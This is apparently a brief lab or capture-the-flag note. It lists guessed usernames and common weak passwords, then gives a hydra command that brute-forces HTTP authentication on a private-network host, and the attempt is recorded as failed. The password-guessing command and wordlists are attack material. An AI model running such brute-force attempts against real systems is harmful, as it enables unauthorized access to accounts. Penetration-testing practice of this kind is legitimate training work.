
users
```
admin
root
default
offsec
anita
steven
miranda
mark
```

passwords
```
default
password
password1
password!
admin
admin!
admin1
p@ssword
p@ssword1
p@ssword!
```

```
hydra -L users.txt -P passwords.txt 192.168.219.191 http-get /index.html
```

FAILED